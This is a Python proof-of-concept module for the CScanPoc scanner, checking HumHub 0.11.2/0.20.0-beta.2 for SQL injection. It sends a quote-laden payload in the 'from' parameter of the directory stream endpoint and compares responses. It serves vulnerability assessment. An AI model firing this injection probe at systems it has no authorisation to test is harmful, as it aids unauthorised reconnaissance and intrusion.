# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'HumHub_0001' # 平台漏洞编号，留空
    name = 'HumHub 0.11.2/0.20.0-beta.2 - SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-11-30'  # 漏洞公布时间
    desc = '''
        While conducting an internal software evaluation, LSE Leading
        Security Experts GmbH discovered that the humhub social networking
        software is subject to an sql-injection attack.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/38831/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'HumHub'  # 漏洞应用名称
    product_version = '0.11.2/0.20.0-beta.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '69e2809b-5488-4fe5-9630-e24ad71679e1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload1 = '/index.php?r=directory/directory/stream&limit=4&sort=c&from=5&mode=normal'
            payload2 = '/index.php?r=directory/directory/stream&limit=4&sort=c&from=5%27%22&mode=normal'
            code1, head, res1, errcode, _ = hh.http(self.target + payload1)
            code2, head, res2, errcode, _ = hh.http(self.target + payload2)

            if (code1 == 200 and code2 == 500) and res1 <> res2:
                #security_info('GET Injection:'+payload2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
